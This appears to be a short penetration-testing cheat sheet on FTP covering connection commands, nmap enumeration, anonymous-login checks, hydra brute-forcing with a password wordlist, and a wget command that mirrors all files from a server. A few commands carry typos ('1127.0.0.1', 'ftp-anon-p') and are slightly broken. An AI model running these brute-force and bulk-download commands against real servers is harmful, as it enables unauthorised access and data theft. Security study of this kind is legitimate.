# File Transfer Protocol) (FTP)

Used to Transfer Files From Server To The client and runs on Port 21.

* ***Connect to FTP***

```shell
ftp ip-address 
```
![scrren1](https://user-images.githubusercontent.com/92652606/145721149-9c9e8a94-b97d-4819-bed9-fd9ce33e2250.png)

```shell
nc -nv 10.10.2.1 21
telnet 10.10.12.1 21 
```
```shell
openssl s_client -connect 1127.0.0.1:21 -starttls ftp # if ftp runs with ssl/tls 

````


* ***Enumrating FTP*** 

```shell
nmap -script=ftp-anon-p 21 10.10.0.1

nmap -Pn -sC -sV -p21 192.168.1.11

```

<img width="634" alt="Screen Shot 2021-12-12 at 17 39 06" src="https://user-images.githubusercontent.com/92652606/145721160-d1509fec-6d63-4b4a-a970-c823b78687aa.png">

```
Checking if Anonymous Loging is enabled anonymous:anonymous
```

* ***Exploiting Ftp***

Using Brute-force Attack

```
hydra -t 4 -l usernmae -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.12 ftp
```
![scrren2](https://user-images.githubusercontent.com/92652606/145722136-c7554bdb-631a-4ed1-bcc7-9b0ab433d8e9.png)

* ***Download all files on FTP server***

```shell
wget -m --no-passive ftp://anonymous:anonymous@127.0.0.1

```



